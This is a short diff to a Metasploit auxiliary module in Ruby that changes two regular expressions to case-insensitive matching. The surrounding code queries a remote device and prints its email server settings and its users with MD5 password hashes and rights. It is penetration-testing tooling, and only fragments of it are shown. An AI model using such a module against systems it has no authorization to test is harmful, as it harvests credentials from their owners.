@@ -104,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(EMAIL)
     if data = sock.get_once.split('&&')
       print_status("Email Settings: @ #{rhost}:#{rport}!")
-      if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
+      if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
         if mailhost = Regexp.last_match[1].split(':')
           print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
           print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
@@ -202,7 +202,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
       data.each do |val|
         usercount += 1
-        pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
+        pass = "#{val[/(([\d]+)[:]([0-9A-Z]+)[:]([0-9A-Z]+))/i]}"
         value = pass.split(":")
         user = "#{value[1]}"
         md5hash = "#{value[2]}"
